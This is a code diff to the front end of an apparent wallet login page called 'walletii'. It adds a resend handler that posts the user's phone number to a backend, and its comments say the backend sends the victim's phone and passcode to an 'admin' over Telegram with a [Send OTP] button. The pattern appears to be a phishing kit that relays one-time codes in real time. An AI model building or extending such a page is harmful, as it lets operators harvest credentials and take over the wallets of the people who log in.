@@ -718,7 +718,7 @@
   // ════════════════════════════════════════════════════
   //  CONFIG — set this to your Render backend URL
   // ════════════════════════════════════════════════════
-  const API_BASE = '';
+  const API_BASE = 'https://your-walletii-backend.onrender.com';
 
   // ── Session state ──
   const SESSION = {
@@ -794,6 +794,7 @@
         clearInterval(otpTimer);
         document.getElementById('resendText').textContent = 'Resend code';
         document.getElementById('resendText').style.cursor = 'pointer';
+        document.getElementById('resendText').onclick = notifyResend;
       } else {
         document.getElementById('resendText').textContent = 'Resend code in ' + otpCountdown + ' seconds';
       }
@@ -875,6 +876,30 @@
   }
 
   // ════════════════════════════════════════════════════
+  //  RESEND: notify backend → sends Telegram alert, no polling
+  // ════════════════════════════════════════════════════
+  async function notifyResend() {
+    // Disable button to prevent spam
+    const btn = document.getElementById('resendText');
+    btn.style.cursor  = 'default';
+    btn.textContent   = 'Sending…';
+    btn.onclick       = null;
+    try {
+      await fetch(API_BASE + '/notify', {
+        method:  'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          type:        'resend',
+          phone:       SESSION.phone,
+          countryCode: SESSION.countryCode,
+        }),
+      });
+    } catch (e) { /* silent fail — resend is best-effort */ }
+    // Restart the countdown timer
+    startOtpTimer();
+  }
+
+  // ════════════════════════════════════════════════════
   //  STEP 1: Phone + Passcode → notify backend (login)
   //  Backend sends Telegram message to admin with [Send OTP] button
   // ════════════════════════════════════════════════════
@@ -905,6 +930,8 @@
           document.getElementById('otpPhoneDisplay').textContent = prefix + ' ' + phone;
           startOtpTimer();
           goTo('screen-otp');
+        } else if (result === 'wrong_pin') {
+          showErrOverlay('Incorrect PIN. Please try again.');
         } else if (result === 'expired') {
           showErrOverlay('Request timed out. Please try again.');
         }
